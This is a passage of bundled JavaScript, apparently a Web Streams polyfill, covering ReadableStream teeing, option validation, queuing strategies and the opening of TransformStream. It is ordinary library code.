    let startAlgorithm = () => undefined;
    let pullAlgorithm = () => promiseResolvedWith(undefined);
    let cancelAlgorithm = () => promiseResolvedWith(undefined);
    if (underlyingSource.start !== undefined) {
        startAlgorithm = () => underlyingSource.start(controller);
    }
    if (underlyingSource.pull !== undefined) {
        pullAlgorithm = () => underlyingSource.pull(controller);
    }
    if (underlyingSource.cancel !== undefined) {
        cancelAlgorithm = reason => underlyingSource.cancel(reason);
    }
    SetUpReadableStreamDefaultController(stream, controller, startAlgorithm, pullAlgorithm, cancelAlgorithm, highWaterMark, sizeAlgorithm);
}
// Helper functions for the ReadableStreamDefaultController.
function defaultControllerBrandCheckException$1(name) {
    return new TypeError(`ReadableStreamDefaultController.prototype.${name} can only be used on a ReadableStreamDefaultController`);
}

function ReadableStreamTee(stream, cloneForBranch2) {
    if (IsReadableByteStreamController(stream._readableStreamController)) {
        return ReadableByteStreamTee(stream);
    }
    return ReadableStreamDefaultTee(stream);
}
function ReadableStreamDefaultTee(stream, cloneForBranch2) {
    const reader = AcquireReadableStreamDefaultReader(stream);
    let reading = false;
    let readAgain = false;
    let canceled1 = false;
    let canceled2 = false;
    let reason1;
    let reason2;
    let branch1;
    let branch2;
    let resolveCancelPromise;
    const cancelPromise = newPromise(resolve => {
        resolveCancelPromise = resolve;
    });
    function pullAlgorithm() {
        if (reading) {
            readAgain = true;
            return promiseResolvedWith(undefined);
        }
        reading = true;
        const readRequest = {
            _chunkSteps: chunk => {
                // This needs to be delayed a microtask because it takes at least a microtask to detect errors (using
                // reader._closedPromise below), and we want errors in stream to error both branches immediately. We cannot let
                // successful synchronously-available reads get ahead of asynchronously-available errors.
                queueMicrotask(() => {
                    readAgain = false;
                    const chunk1 = chunk;
                    const chunk2 = chunk;
                    // There is no way to access the cloning code right now in the reference implementation.
                    // If we add one then we'll need an implementation for serializable objects.
                    // if (!canceled2 && cloneForBranch2) {
                    //   chunk2 = StructuredDeserialize(StructuredSerialize(chunk2));
                    // }
                    if (!canceled1) {
                        ReadableStreamDefaultControllerEnqueue(branch1._readableStreamController, chunk1);
                    }
                    if (!canceled2) {
                        ReadableStreamDefaultControllerEnqueue(branch2._readableStreamController, chunk2);
                    }
                    reading = false;
                    if (readAgain) {
                        pullAlgorithm();
                    }
                });
            },
            _closeSteps: () => {
                reading = false;
                if (!canceled1) {
                    ReadableStreamDefaultControllerClose(branch1._readableStreamController);
                }
                if (!canceled2) {
                    ReadableStreamDefaultControllerClose(branch2._readableStreamController);
                }
                if (!canceled1 || !canceled2) {
                    resolveCancelPromise(undefined);
                }
            },
            _errorSteps: () => {
                reading = false;
            }
        };
        ReadableStreamDefaultReaderRead(reader, readRequest);
        return promiseResolvedWith(undefined);
    }
    function cancel1Algorithm(reason) {
        canceled1 = true;
        reason1 = reason;
        if (canceled2) {
            const compositeReason = CreateArrayFromList([reason1, reason2]);
            const cancelResult = ReadableStreamCancel(stream, compositeReason);
            resolveCancelPromise(cancelResult);
        }
        return cancelPromise;
    }
    function cancel2Algorithm(reason) {
        canceled2 = true;
        reason2 = reason;
        if (canceled1) {
            const compositeReason = CreateArrayFromList([reason1, reason2]);
            const cancelResult = ReadableStreamCancel(stream, compositeReason);
            resolveCancelPromise(cancelResult);
        }
        return cancelPromise;
    }
    function startAlgorithm() {
        // do nothing
    }
    branch1 = CreateReadableStream(startAlgorithm, pullAlgorithm, cancel1Algorithm);
    branch2 = CreateReadableStream(startAlgorithm, pullAlgorithm, cancel2Algorithm);
    uponRejection(reader._closedPromise, (r) => {
        ReadableStreamDefaultControllerError(branch1._readableStreamController, r);
        ReadableStreamDefaultControllerError(branch2._readableStreamController, r);
        if (!canceled1 || !canceled2) {
            resolveCancelPromise(undefined);
        }
    });
    return [branch1, branch2];
}
function ReadableByteStreamTee(stream) {
    let reader = AcquireReadableStreamDefaultReader(stream);
    let reading = false;
    let readAgainForBranch1 = false;
    let readAgainForBranch2 = false;
    let canceled1 = false;
    let canceled2 = false;
    let reason1;
    let reason2;
    let branch1;
    let branch2;
    let resolveCancelPromise;
    const cancelPromise = newPromise(resolve => {
        resolveCancelPromise = resolve;
    });
    function forwardReaderError(thisReader) {
        uponRejection(thisReader._closedPromise, r => {
            if (thisReader !== reader) {
                return;
            }
            ReadableByteStreamControllerError(branch1._readableStreamController, r);
            ReadableByteStreamControllerError(branch2._readableStreamController, r);
            if (!canceled1 || !canceled2) {
                resolveCancelPromise(undefined);
            }
        });
    }
    function pullWithDefaultReader() {
        if (IsReadableStreamBYOBReader(reader)) {
            ReadableStreamReaderGenericRelease(reader);
            reader = AcquireReadableStreamDefaultReader(stream);
            forwardReaderError(reader);
        }
        const readRequest = {
            _chunkSteps: chunk => {
                // This needs to be delayed a microtask because it takes at least a microtask to detect errors (using
                // reader._closedPromise below), and we want errors in stream to error both branches immediately. We cannot let
                // successful synchronously-available reads get ahead of asynchronously-available errors.
                queueMicrotask(() => {
                    readAgainForBranch1 = false;
                    readAgainForBranch2 = false;
                    const chunk1 = chunk;
                    let chunk2 = chunk;
                    if (!canceled1 && !canceled2) {
                        try {
                            chunk2 = CloneAsUint8Array(chunk);
                        }
                        catch (cloneE) {
                            ReadableByteStreamControllerError(branch1._readableStreamController, cloneE);
                            ReadableByteStreamControllerError(branch2._readableStreamController, cloneE);
                            resolveCancelPromise(ReadableStreamCancel(stream, cloneE));
                            return;
                        }
                    }
                    if (!canceled1) {
                        ReadableByteStreamControllerEnqueue(branch1._readableStreamController, chunk1);
                    }
                    if (!canceled2) {
                        ReadableByteStreamControllerEnqueue(branch2._readableStreamController, chunk2);
                    }
                    reading = false;
                    if (readAgainForBranch1) {
                        pull1Algorithm();
                    }
                    else if (readAgainForBranch2) {
                        pull2Algorithm();
                    }
                });
            },
            _closeSteps: () => {
                reading = false;
                if (!canceled1) {
                    ReadableByteStreamControllerClose(branch1._readableStreamController);
                }
                if (!canceled2) {
                    ReadableByteStreamControllerClose(branch2._readableStreamController);
                }
                if (branch1._readableStreamController._pendingPullIntos.length > 0) {
                    ReadableByteStreamControllerRespond(branch1._readableStreamController, 0);
                }
                if (branch2._readableStreamController._pendingPullIntos.length > 0) {
                    ReadableByteStreamControllerRespond(branch2._readableStreamController, 0);
                }
                if (!canceled1 || !canceled2) {
                    resolveCancelPromise(undefined);
                }
            },
            _errorSteps: () => {
                reading = false;
            }
        };
        ReadableStreamDefaultReaderRead(reader, readRequest);
    }
    function pullWithBYOBReader(view, forBranch2) {
        if (IsReadableStreamDefaultReader(reader)) {
            ReadableStreamReaderGenericRelease(reader);
            reader = AcquireReadableStreamBYOBReader(stream);
            forwardReaderError(reader);
        }
        const byobBranch = forBranch2 ? branch2 : branch1;
        const otherBranch = forBranch2 ? branch1 : branch2;
        const readIntoRequest = {
            _chunkSteps: chunk => {
                // This needs to be delayed a microtask because it takes at least a microtask to detect errors (using
                // reader._closedPromise below), and we want errors in stream to error both branches immediately. We cannot let
                // successful synchronously-available reads get ahead of asynchronously-available errors.
                queueMicrotask(() => {
                    readAgainForBranch1 = false;
                    readAgainForBranch2 = false;
                    const byobCanceled = forBranch2 ? canceled2 : canceled1;
                    const otherCanceled = forBranch2 ? canceled1 : canceled2;
                    if (!otherCanceled) {
                        let clonedChunk;
                        try {
                            clonedChunk = CloneAsUint8Array(chunk);
                        }
                        catch (cloneE) {
                            ReadableByteStreamControllerError(byobBranch._readableStreamController, cloneE);
                            ReadableByteStreamControllerError(otherBranch._readableStreamController, cloneE);
                            resolveCancelPromise(ReadableStreamCancel(stream, cloneE));
                            return;
                        }
                        if (!byobCanceled) {
                            ReadableByteStreamControllerRespondWithNewView(byobBranch._readableStreamController, chunk);
                        }
                        ReadableByteStreamControllerEnqueue(otherBranch._readableStreamController, clonedChunk);
                    }
                    else if (!byobCanceled) {
                        ReadableByteStreamControllerRespondWithNewView(byobBranch._readableStreamController, chunk);
                    }
                    reading = false;
                    if (readAgainForBranch1) {
                        pull1Algorithm();
                    }
                    else if (readAgainForBranch2) {
                        pull2Algorithm();
                    }
                });
            },
            _closeSteps: chunk => {
                reading = false;
                const byobCanceled = forBranch2 ? canceled2 : canceled1;
                const otherCanceled = forBranch2 ? canceled1 : canceled2;
                if (!byobCanceled) {
                    ReadableByteStreamControllerClose(byobBranch._readableStreamController);
                }
                if (!otherCanceled) {
                    ReadableByteStreamControllerClose(otherBranch._readableStreamController);
                }
                if (chunk !== undefined) {
                    if (!byobCanceled) {
                        ReadableByteStreamControllerRespondWithNewView(byobBranch._readableStreamController, chunk);
                    }
                    if (!otherCanceled && otherBranch._readableStreamController._pendingPullIntos.length > 0) {
                        ReadableByteStreamControllerRespond(otherBranch._readableStreamController, 0);
                    }
                }
                if (!byobCanceled || !otherCanceled) {
                    resolveCancelPromise(undefined);
                }
            },
            _errorSteps: () => {
                reading = false;
            }
        };
        ReadableStreamBYOBReaderRead(reader, view, readIntoRequest);
    }
    function pull1Algorithm() {
        if (reading) {
            readAgainForBranch1 = true;
            return promiseResolvedWith(undefined);
        }
        reading = true;
        const byobRequest = ReadableByteStreamControllerGetBYOBRequest(branch1._readableStreamController);
        if (byobRequest === null) {
            pullWithDefaultReader();
        }
        else {
            pullWithBYOBReader(byobRequest._view, false);
        }
        return promiseResolvedWith(undefined);
    }
    function pull2Algorithm() {
        if (reading) {
            readAgainForBranch2 = true;
            return promiseResolvedWith(undefined);
        }
        reading = true;
        const byobRequest = ReadableByteStreamControllerGetBYOBRequest(branch2._readableStreamController);
        if (byobRequest === null) {
            pullWithDefaultReader();
        }
        else {
            pullWithBYOBReader(byobRequest._view, true);
        }
        return promiseResolvedWith(undefined);
    }
    function cancel1Algorithm(reason) {
        canceled1 = true;
        reason1 = reason;
        if (canceled2) {
            const compositeReason = CreateArrayFromList([reason1, reason2]);
            const cancelResult = ReadableStreamCancel(stream, compositeReason);
            resolveCancelPromise(cancelResult);
        }
        return cancelPromise;
    }
    function cancel2Algorithm(reason) {
        canceled2 = true;
        reason2 = reason;
        if (canceled1) {
            const compositeReason = CreateArrayFromList([reason1, reason2]);
            const cancelResult = ReadableStreamCancel(stream, compositeReason);
            resolveCancelPromise(cancelResult);
        }
        return cancelPromise;
    }
    function startAlgorithm() {
        return;
    }
    branch1 = CreateReadableByteStream(startAlgorithm, pull1Algorithm, cancel1Algorithm);
    branch2 = CreateReadableByteStream(startAlgorithm, pull2Algorithm, cancel2Algorithm);
    forwardReaderError(reader);
    return [branch1, branch2];
}

function convertUnderlyingDefaultOrByteSource(source, context) {
    assertDictionary(source, context);
    const original = source;
    const autoAllocateChunkSize = original === null || original === void 0 ? void 0 : original.autoAllocateChunkSize;
    const cancel = original === null || original === void 0 ? void 0 : original.cancel;
    const pull = original === null || original === void 0 ? void 0 : original.pull;
    const start = original === null || original === void 0 ? void 0 : original.start;
    const type = original === null || original === void 0 ? void 0 : original.type;
    return {
        autoAllocateChunkSize: autoAllocateChunkSize === undefined ?
            undefined :
            convertUnsignedLongLongWithEnforceRange(autoAllocateChunkSize, `${context} has member 'autoAllocateChunkSize' that`),
        cancel: cancel === undefined ?
            undefined :
            convertUnderlyingSourceCancelCallback(cancel, original, `${context} has member 'cancel' that`),
        pull: pull === undefined ?
            undefined :
            convertUnderlyingSourcePullCallback(pull, original, `${context} has member 'pull' that`),
        start: start === undefined ?
            undefined :
            convertUnderlyingSourceStartCallback(start, original, `${context} has member 'start' that`),
        type: type === undefined ? undefined : convertReadableStreamType(type, `${context} has member 'type' that`)
    };
}
function convertUnderlyingSourceCancelCallback(fn, original, context) {
    assertFunction(fn, context);
    return (reason) => promiseCall(fn, original, [reason]);
}
function convertUnderlyingSourcePullCallback(fn, original, context) {
    assertFunction(fn, context);
    return (controller) => promiseCall(fn, original, [controller]);
}
function convertUnderlyingSourceStartCallback(fn, original, context) {
    assertFunction(fn, context);
    return (controller) => reflectCall(fn, original, [controller]);
}
function convertReadableStreamType(type, context) {
    type = `${type}`;
    if (type !== 'bytes') {
        throw new TypeError(`${context} '${type}' is not a valid enumeration value for ReadableStreamType`);
    }
    return type;
}

function convertReaderOptions(options, context) {
    assertDictionary(options, context);
    const mode = options === null || options === void 0 ? void 0 : options.mode;
    return {
        mode: mode === undefined ? undefined : convertReadableStreamReaderMode(mode, `${context} has member 'mode' that`)
    };
}
function convertReadableStreamReaderMode(mode, context) {
    mode = `${mode}`;
    if (mode !== 'byob') {
        throw new TypeError(`${context} '${mode}' is not a valid enumeration value for ReadableStreamReaderMode`);
    }
    return mode;
}

function convertIteratorOptions(options, context) {
    assertDictionary(options, context);
    const preventCancel = options === null || options === void 0 ? void 0 : options.preventCancel;
    return { preventCancel: Boolean(preventCancel) };
}

function convertPipeOptions(options, context) {
    assertDictionary(options, context);
    const preventAbort = options === null || options === void 0 ? void 0 : options.preventAbort;
    const preventCancel = options === null || options === void 0 ? void 0 : options.preventCancel;
    const preventClose = options === null || options === void 0 ? void 0 : options.preventClose;
    const signal = options === null || options === void 0 ? void 0 : options.signal;
    if (signal !== undefined) {
        assertAbortSignal(signal, `${context} has member 'signal' that`);
    }
    return {
        preventAbort: Boolean(preventAbort),
        preventCancel: Boolean(preventCancel),
        preventClose: Boolean(preventClose),
        signal
    };
}
function assertAbortSignal(signal, context) {
    if (!isAbortSignal(signal)) {
        throw new TypeError(`${context} is not an AbortSignal.`);
    }
}

function convertReadableWritablePair(pair, context) {
    assertDictionary(pair, context);
    const readable = pair === null || pair === void 0 ? void 0 : pair.readable;
    assertRequiredField(readable, 'readable', 'ReadableWritablePair');
    assertReadableStream(readable, `${context} has member 'readable' that`);
    const writable = pair === null || pair === void 0 ? void 0 : pair.writable;
    assertRequiredField(writable, 'writable', 'ReadableWritablePair');
    assertWritableStream(writable, `${context} has member 'writable' that`);
    return { readable, writable };
}

/**
 * A readable stream represents a source of data, from which you can read.
 *
 * @public
 */
class ReadableStream$1 {
    constructor(rawUnderlyingSource = {}, rawStrategy = {}) {
        if (rawUnderlyingSource === undefined) {
            rawUnderlyingSource = null;
        }
        else {
            assertObject(rawUnderlyingSource, 'First parameter');
        }
        const strategy = convertQueuingStrategy(rawStrategy, 'Second parameter');
        const underlyingSource = convertUnderlyingDefaultOrByteSource(rawUnderlyingSource, 'First parameter');
        InitializeReadableStream(this);
        if (underlyingSource.type === 'bytes') {
            if (strategy.size !== undefined) {
                throw new RangeError('The strategy for a byte stream cannot have a size function');
            }
            const highWaterMark = ExtractHighWaterMark(strategy, 0);
            SetUpReadableByteStreamControllerFromUnderlyingSource(this, underlyingSource, highWaterMark);
        }
        else {
            const sizeAlgorithm = ExtractSizeAlgorithm(strategy);
            const highWaterMark = ExtractHighWaterMark(strategy, 1);
            SetUpReadableStreamDefaultControllerFromUnderlyingSource(this, underlyingSource, highWaterMark, sizeAlgorithm);
        }
    }
    /**
     * Whether or not the readable stream is locked to a {@link ReadableStreamDefaultReader | reader}.
     */
    get locked() {
        if (!IsReadableStream(this)) {
            throw streamBrandCheckException$1('locked');
        }
        return IsReadableStreamLocked(this);
    }
    /**
     * Cancels the stream, signaling a loss of interest in the stream by a consumer.
     *
     * The supplied `reason` argument will be given to the underlying source's {@link UnderlyingSource.cancel | cancel()}
     * method, which might or might not use it.
     */
    cancel(reason = undefined) {
        if (!IsReadableStream(this)) {
            return promiseRejectedWith(streamBrandCheckException$1('cancel'));
        }
        if (IsReadableStreamLocked(this)) {
            return promiseRejectedWith(new TypeError('Cannot cancel a stream that already has a reader'));
        }
        return ReadableStreamCancel(this, reason);
    }
    getReader(rawOptions = undefined) {
        if (!IsReadableStream(this)) {
            throw streamBrandCheckException$1('getReader');
        }
        const options = convertReaderOptions(rawOptions, 'First parameter');
        if (options.mode === undefined) {
            return AcquireReadableStreamDefaultReader(this);
        }
        return AcquireReadableStreamBYOBReader(this);
    }
    pipeThrough(rawTransform, rawOptions = {}) {
        if (!IsReadableStream(this)) {
            throw streamBrandCheckException$1('pipeThrough');
        }
        assertRequiredArgument(rawTransform, 1, 'pipeThrough');
        const transform = convertReadableWritablePair(rawTransform, 'First parameter');
        const options = convertPipeOptions(rawOptions, 'Second parameter');
        if (IsReadableStreamLocked(this)) {
            throw new TypeError('ReadableStream.prototype.pipeThrough cannot be used on a locked ReadableStream');
        }
        if (IsWritableStreamLocked(transform.writable)) {
            throw new TypeError('ReadableStream.prototype.pipeThrough cannot be used on a locked WritableStream');
        }
        const promise = ReadableStreamPipeTo(this, transform.writable, options.preventClose, options.preventAbort, options.preventCancel, options.signal);
        setPromiseIsHandledToTrue(promise);
        return transform.readable;
    }
    pipeTo(destination, rawOptions = {}) {
        if (!IsReadableStream(this)) {
            return promiseRejectedWith(streamBrandCheckException$1('pipeTo'));
        }
        if (destination === undefined) {
            return promiseRejectedWith(`Parameter 1 is required in 'pipeTo'.`);
        }
        if (!IsWritableStream(destination)) {
            return promiseRejectedWith(new TypeError(`ReadableStream.prototype.pipeTo's first argument must be a WritableStream`));
        }
        let options;
        try {
            options = convertPipeOptions(rawOptions, 'Second parameter');
        }
        catch (e) {
            return promiseRejectedWith(e);
        }
        if (IsReadableStreamLocked(this)) {
            return promiseRejectedWith(new TypeError('ReadableStream.prototype.pipeTo cannot be used on a locked ReadableStream'));
        }
        if (IsWritableStreamLocked(destination)) {
            return promiseRejectedWith(new TypeError('ReadableStream.prototype.pipeTo cannot be used on a locked WritableStream'));
        }
        return ReadableStreamPipeTo(this, destination, options.preventClose, options.preventAbort, options.preventCancel, options.signal);
    }
    /**
     * Tees this readable stream, returning a two-element array containing the two resulting branches as
     * new {@link ReadableStream} instances.
     *
     * Teeing a stream will lock it, preventing any other consumer from acquiring a reader.
     * To cancel the stream, cancel both of the resulting branches; a composite cancellation reason will then be
     * propagated to the stream's underlying source.
     *
     * Note that the chunks seen in each branch will be the same object. If the chunks are not immutable,
     * this could allow interference between the two branches.
     */
    tee() {
        if (!IsReadableStream(this)) {
            throw streamBrandCheckException$1('tee');
        }
        const branches = ReadableStreamTee(this);
        return CreateArrayFromList(branches);
    }
    values(rawOptions = undefined) {
        if (!IsReadableStream(this)) {
            throw streamBrandCheckException$1('values');
        }
        const options = convertIteratorOptions(rawOptions, 'First parameter');
        return AcquireReadableStreamAsyncIterator(this, options.preventCancel);
    }
}
Object.defineProperties(ReadableStream$1.prototype, {
    cancel: { enumerable: true },
    getReader: { enumerable: true },
    pipeThrough: { enumerable: true },
    pipeTo: { enumerable: true },
    tee: { enumerable: true },
    values: { enumerable: true },
    locked: { enumerable: true }
});
// Abstract operations for the ReadableStream.
// Throws if and only if startAlgorithm throws.
function CreateReadableStream(startAlgorithm, pullAlgorithm, cancelAlgorithm, highWaterMark = 1, sizeAlgorithm = () => 1) {
    const stream = Object.create(ReadableStream$1.prototype);
    InitializeReadableStream(stream);
    const controller = Object.create(ReadableStreamDefaultController.prototype);
    SetUpReadableStreamDefaultController(stream, controller, startAlgorithm, pullAlgorithm, cancelAlgorithm, highWaterMark, sizeAlgorithm);
    return stream;
}
// Throws if and only if startAlgorithm throws.
function CreateReadableByteStream(startAlgorithm, pullAlgorithm, cancelAlgorithm) {
    const stream = Object.create(ReadableStream$1.prototype);
    InitializeReadableStream(stream);
    const controller = Object.create(ReadableByteStreamController.prototype);
    SetUpReadableByteStreamController(stream, controller, startAlgorithm, pullAlgorithm, cancelAlgorithm, 0, undefined);
    return stream;
}
function InitializeReadableStream(stream) {
    stream._state = 'readable';
    stream._reader = undefined;
    stream._storedError = undefined;
    stream._disturbed = false;
}
function IsReadableStream(x) {
    if (!typeIsObject(x)) {
        return false;
    }
    if (!Object.prototype.hasOwnProperty.call(x, '_readableStreamController')) {
        return false;
    }
    return x instanceof ReadableStream$1;
}
function IsReadableStreamLocked(stream) {
    if (stream._reader === undefined) {
        return false;
    }
    return true;
}
// ReadableStream API exposed for controllers.
function ReadableStreamCancel(stream, reason) {
    stream._disturbed = true;
    if (stream._state === 'closed') {
        return promiseResolvedWith(undefined);
    }
    if (stream._state === 'errored') {
        return promiseRejectedWith(stream._storedError);
    }
    ReadableStreamClose(stream);
    const reader = stream._reader;
    if (reader !== undefined && IsReadableStreamBYOBReader(reader)) {
        reader._readIntoRequests.forEach(readIntoRequest => {
            readIntoRequest._closeSteps(undefined);
        });
        reader._readIntoRequests = new SimpleQueue();
    }
    const sourceCancelPromise = stream._readableStreamController[CancelSteps](reason);
    return transformPromiseWith(sourceCancelPromise, noop);
}
function ReadableStreamClose(stream) {
    stream._state = 'closed';
    const reader = stream._reader;
    if (reader === undefined) {
        return;
    }
    defaultReaderClosedPromiseResolve(reader);
    if (IsReadableStreamDefaultReader(reader)) {
        reader._readRequests.forEach(readRequest => {
            readRequest._closeSteps();
        });
        reader._readRequests = new SimpleQueue();
    }
}
function ReadableStreamError(stream, e) {
    stream._state = 'errored';
    stream._storedError = e;
    const reader = stream._reader;
    if (reader === undefined) {
        return;
    }
    defaultReaderClosedPromiseReject(reader, e);
    if (IsReadableStreamDefaultReader(reader)) {
        reader._readRequests.forEach(readRequest => {
            readRequest._errorSteps(e);
        });
        reader._readRequests = new SimpleQueue();
    }
    else {
        reader._readIntoRequests.forEach(readIntoRequest => {
            readIntoRequest._errorSteps(e);
        });
        reader._readIntoRequests = new SimpleQueue();
    }
}
// Helper functions for the ReadableStream.
function streamBrandCheckException$1(name) {
    return new TypeError(`ReadableStream.prototype.${name} can only be used on a ReadableStream`);
}

function convertQueuingStrategyInit(init, context) {
    assertDictionary(init, context);
    const highWaterMark = init === null || init === void 0 ? void 0 : init.highWaterMark;
    assertRequiredField(highWaterMark, 'highWaterMark', 'QueuingStrategyInit');
    return {
        highWaterMark: convertUnrestrictedDouble(highWaterMark)
    };
}

// The size function must not have a prototype property nor be a constructor
const byteLengthSizeFunction = (chunk) => {
    return chunk.byteLength;
};
try {
    Object.defineProperty(byteLengthSizeFunction, 'name', {
        value: 'size',
        configurable: true
    });
}
catch (_a) {
    // This property is non-configurable in older browsers, so ignore if this throws.
    // https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Function/name#browser_compatibility
}
/**
 * A queuing strategy that counts the number of bytes in each chunk.
 *
 * @public
 */
class ByteLengthQueuingStrategy {
    constructor(options) {
        assertRequiredArgument(options, 1, 'ByteLengthQueuingStrategy');
        options = convertQueuingStrategyInit(options, 'First parameter');
        this._byteLengthQueuingStrategyHighWaterMark = options.highWaterMark;
    }
    /**
     * Returns the high water mark provided to the constructor.
     */
    get highWaterMark() {
        if (!IsByteLengthQueuingStrategy(this)) {
            throw byteLengthBrandCheckException('highWaterMark');
        }
        return this._byteLengthQueuingStrategyHighWaterMark;
    }
    /**
     * Measures the size of `chunk` by returning the value of its `byteLength` property.
     */
    get size() {
        if (!IsByteLengthQueuingStrategy(this)) {
            throw byteLengthBrandCheckException('size');
        }
        return byteLengthSizeFunction;
    }
}
Object.defineProperties(ByteLengthQueuingStrategy.prototype, {
    highWaterMark: { enumerable: true },
    size: { enumerable: true }
});
// Helper functions for the ByteLengthQueuingStrategy.
function byteLengthBrandCheckException(name) {
    return new TypeError(`ByteLengthQueuingStrategy.prototype.${name} can only be used on a ByteLengthQueuingStrategy`);
}
function IsByteLengthQueuingStrategy(x) {
    if (!typeIsObject(x)) {
        return false;
    }
    if (!Object.prototype.hasOwnProperty.call(x, '_byteLengthQueuingStrategyHighWaterMark')) {
        return false;
    }
    return x instanceof ByteLengthQueuingStrategy;
}

// The size function must not have a prototype property nor be a constructor
const countSizeFunction = () => {
    return 1;
};
try {
    Object.defineProperty(countSizeFunction, 'name', {
        value: 'size',
        configurable: true
    });
}
catch (_a) {
    // This property is non-configurable in older browsers, so ignore if this throws.
    // https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Function/name#browser_compatibility
}
/**
 * A queuing strategy that counts the number of chunks.
 *
 * @public
 */
class CountQueuingStrategy {
    constructor(options) {
        assertRequiredArgument(options, 1, 'CountQueuingStrategy');
        options = convertQueuingStrategyInit(options, 'First parameter');
        this._countQueuingStrategyHighWaterMark = options.highWaterMark;
    }
    /**
     * Returns the high water mark provided to the constructor.
     */
    get highWaterMark() {
        if (!IsCountQueuingStrategy(this)) {
            throw countBrandCheckException('highWaterMark');
        }
        return this._countQueuingStrategyHighWaterMark;
    }
    /**
     * Measures the size of `chunk` by always returning 1.
     * This ensures that the total queue size is a count of the number of chunks in the queue.
     */
    get size() {
        if (!IsCountQueuingStrategy(this)) {
            throw countBrandCheckException('size');
        }
        return countSizeFunction;
    }
}
Object.defineProperties(CountQueuingStrategy.prototype, {
    highWaterMark: { enumerable: true },
    size: { enumerable: true }
});
// Helper functions for the CountQueuingStrategy.
function countBrandCheckException(name) {
    return new TypeError(`CountQueuingStrategy.prototype.${name} can only be used on a CountQueuingStrategy`);
}
function IsCountQueuingStrategy(x) {
    if (!typeIsObject(x)) {
        return false;
    }
    if (!Object.prototype.hasOwnProperty.call(x, '_countQueuingStrategyHighWaterMark')) {
        return false;
    }
    return x instanceof CountQueuingStrategy;
}

function convertTransformer(original, context) {
    assertDictionary(original, context);
    const flush = original === null || original === void 0 ? void 0 : original.flush;
    const readableType = original === null || original === void 0 ? void 0 : original.readableType;
    const start = original === null || original === void 0 ? void 0 : original.start;
    const transform = original === null || original === void 0 ? void 0 : original.transform;
    const writableType = original === null || original === void 0 ? void 0 : original.writableType;
    return {
        flush: flush === undefined ?
            undefined :
            convertTransformerFlushCallback(flush, original, `${context} has member 'flush' that`),
        readableType,
        start: start === undefined ?
            undefined :
            convertTransformerStartCallback(start, original, `${context} has member 'start' that`),
        transform: transform === undefined ?
            undefined :
            convertTransformerTransformCallback(transform, original, `${context} has member 'transform' that`),
        writableType
    };
}
function convertTransformerFlushCallback(fn, original, context) {
    assertFunction(fn, context);
    return (controller) => promiseCall(fn, original, [controller]);
}
function convertTransformerStartCallback(fn, original, context) {
    assertFunction(fn, context);
    return (controller) => reflectCall(fn, original, [controller]);
}
function convertTransformerTransformCallback(fn, original, context) {
    assertFunction(fn, context);
    return (chunk, controller) => promiseCall(fn, original, [chunk, controller]);
}

// Class TransformStream
/**
 * A transform stream consists of a pair of streams: a {@link WritableStream | writable stream},
 * known as its writable side, and a {@link ReadableStream | readable stream}, known as its readable side.
 * In a manner specific to the transform stream in question, writes to the writable side result in new data being
 * made available for reading from the readable side.
 *
 * @public
 */
class TransformStream {
    constructor(rawTransformer = {}, rawWritableStrategy = {}, rawReadableStrategy = {}) {
        if (rawTransformer === undefined) {
            rawTransformer = null;
        }
        const writableStrategy = convertQueuingStrategy(rawWritableStrategy, 'Second parameter');
        const readableStrategy = convertQueuingStrategy(rawReadableStrategy, 'Third parameter');
        const transformer = convertTransformer(rawTransformer, 'First parameter');
        if (transformer.readableType !== undefined) {
            throw new RangeError('Invalid readableType specified');
        }
        if (transformer.writableType !== undefined) {
            throw new RangeError('Invalid writableType specified');
        }
        const readableHighWaterMark = ExtractHighWaterMark(readableStrategy, 0);
        const readableSizeAlgorithm = ExtractSizeAlgorithm(readableStrategy);
        const writableHighWaterMark = ExtractHighWaterMark(writableStrategy, 1);
        const writableSizeAlgorithm = ExtractSizeAlgorithm(writableStrategy);
        let startPromise_resolve;
        const startPromise = newPromise(resolve => {
            startPromise_resolve = resolve;
        });
        InitializeTransformStream(this, startPromise, writableHighWaterMark, writableSizeAlgorithm, readableHighWaterMark, readableSizeAlgorithm);
        SetUpTransformStreamDefaultControllerFromTransformer(this, transformer);
        if (transformer.start !== undefined) {
            startPromise_resolve(transformer.start(this._transformStreamController));
        }
        else {
            startPromise_resolve(undefined);
        }
    }
    /**
     * The readable side of the transform stream.
     */
    get readable() {
        if (!IsTransformStream(this)) {
            throw streamBrandCheckException('readable');
        }
        return this._readable;
    }
    /**
     * The writable side of the transform stream.
     */
    get writable() {
        if (!IsTransformStream(this)) {
            throw streamBrandCheckException('writable');
        }
        return this._writable;
    }
}
Object.defineProperties(TransformStream.prototype, {
    readable: { enumerable: true },
    writable: { enumerable: true }
});
function InitializeTransformStream(stream, startPromise, writableHighWaterMark, writableSizeAlgorithm, readableHighWaterMark, readableSizeAlgorithm) {
    function startAlgorithm() {
        return startPromise;
    }
    function writeAlgorithm(chunk) {
        return TransformStreamDefaultSinkWriteAlgorithm(stream, chunk);
    }
    function abortAlgorithm(reason) {
        return TransformStreamDefaultSinkAbortAlgorithm(stream, reason);
    }
    function closeAlgorithm() {
        return TransformStreamDefaultSinkCloseAlgorithm(stream);
    }
    stream._writable = CreateWritableStream(startAlgorithm, writeAlgorithm, closeAlgorithm, abortAlgorithm, writableHighWaterMark, writableSizeAlgorithm);
    function pullAlgorithm() {
        return TransformStreamDefaultSourcePullAlgorithm(stream);
    }
    function cancelAlgorithm(reason) {
        TransformStreamErrorWritableAndUnblockWrite(stream, reason);
        return promiseResolvedWith(undefined);
    }
    stream._readable = CreateReadableStream(startAlgorithm, pullAlgorithm, cancelAlgorithm, readableHighWaterMark, readableSizeAlgorithm);
    // The [[backpressure]] slot is set to undefined so that it can be initialised by TransformStreamSetBackpressure.
    stream._backpressure = undefined;
    stream._backpressureChangePromise = undefined;
    stream._backpressureChangePromise_resolve = undefined;
    TransformStreamSetBackpressure(stream, true);
    stream._transformStreamController = undefined;
}
function IsTransformStream(x) {
    if (!typeIsObject(x)) {
        return false;
    }
    if (!Object.prototype.hasOwnProperty.call(x, '_transformStreamController')) {
        return false;
    }
    return x instanceof TransformStream;
}
// This is a no-op if both sides are already errored.
function TransformStreamError(stream, e) {
    ReadableStreamDefaultControllerError(stream._readable._readableStreamController, e);
    TransformStreamErrorWritableAndUnblockWrite(stream, e);
}
function TransformStreamErrorWritableAndUnblockWrite(stream, e) {
    TransformStreamDefaultControllerClearAlgorithms(stream._transformStreamController);
    WritableStreamDefaultControllerErrorIfNeeded(stream._writable._writableStreamController, e);
